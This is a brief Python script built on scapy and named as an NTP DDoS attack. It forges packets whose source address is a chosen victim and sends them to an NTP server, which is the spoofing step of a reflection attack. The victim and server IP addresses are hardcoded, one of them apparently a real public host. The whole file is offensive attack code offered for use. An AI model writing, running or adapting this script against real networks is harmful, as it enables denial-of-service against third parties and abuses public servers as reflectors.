#!/usr/bin/python
# coding:utf-8

from scapy.all import *
from scapy.layers.inet import IP, UDP
from scapy.layers.ntp import NTP


class NTPDDosAttack(object):
    def ddos(self, client, ntp_server):
        ip = IP(src=client, dst=ntp_server)
        send(ip / UDP() / NTP())


if __name__ == '__main__':
    ntpDDoSAttack = NTPDDosAttack()
    ntpDDoSAttack.ddos("192.168.31.98", "38.87.36.65")
